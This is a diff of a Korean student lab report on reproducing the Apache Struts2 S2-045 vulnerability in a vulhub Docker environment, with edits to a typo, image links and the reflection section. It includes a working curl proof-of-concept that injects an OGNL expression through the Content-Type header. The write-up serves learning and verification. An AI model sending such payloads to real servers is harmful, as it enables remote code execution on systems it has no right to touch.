@@ -7,7 +7,7 @@
 - Docker Version: 28.0.4
 - Docker Compose Version: 2.34.0
 
-## 3. 실습 과경
+## 3. 실습 과정
 3.1. 취약한 환경 구성
 먼저 vulhub 레포지터리를 클론하고, Struts2 s2-045 취약 버전이 설정된 디렉터리로 이동했다. 이후 docker-compose를 이용해 컨테이너를 띄웠다.
 
@@ -15,8 +15,6 @@ git clone https://github.com/vulhub/vulhub.git
 cd vulhub/struts2/s2-045
 docker compose up -d
 컨테이너가 정상적으로 구동되었고, localhost:8080로 접근할 수 있었다.
-
-![컨테이너 띄운 화면](compose.png)
 
 3.2. 환경 구축 결과
 컨테이너가 정상적으로 올라가면서 Struts2 쇼케이스 페이지가 동작하는 것을 확인했다.
@@ -27,13 +25,14 @@ curl 명령어를 이용해 Content-Type 헤더에 OGNL 표현식을 삽입해 �
 
 curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action
 
-![PoC 성공 화면](curl.png)
-
 4.2. 결과 확인
 응답 본문에 vulnerable이라는 문자열이 출력되면서, 서버에서 OGNL 표현식이 실제로 실행된 것을 확인했다. 이를 통해 취약점이 존재함을 직접 검증할 수 있었다.
 
 ## 5. 느낀점
-이번 실습을 통해 도커로 취약한 환경을 빠르게 구성하고, 실제 취약점이 어떻게 악용될 수 있는지를 직접 체험할 수 있었다. Struts2처럼 널리 사용되는 프레임워크에서도 입력값 검증이 제대로 안 되면 큰 문제가 발생할 수 있다는 점을 실감했다. 실습을 진행하면서 PoC 과정이 생각보다 간단해서 보안 관리의 중요성을 다시 느꼈다.
+이번 과제를 진행하면서, 제가 제대로 방향을 잡고 수행하고 있는지 확신이 들지 않았습니다. 어쩌면 과제를 잘못 이해한 것 같다고 생각합니다.  
+그럼에도 불구하고 주어진 조건 안에서 할 수 있는 최선을 다해 환경을 구축하고, 취약점 검증까지 마무리하려고 노력하였습니다.  
+과정 중 부족한 부분이 많았던 것은 사실이지만, Docker와 취약점 환경 구축 과정을 직접 경험해볼 수 있었던 점은 큰 의미가 있었습니다.  
+만약 기회가 된다면, 과제 내용을 완전히 이해한 상태로 다시 한 번 제대로 도전해보고 싶습니다.
 
 ## 6. 참고 자료
 - Vulhub Struts2 S2-045 환경 (https://vulhub.org/#/environments/struts2/s2-045/)
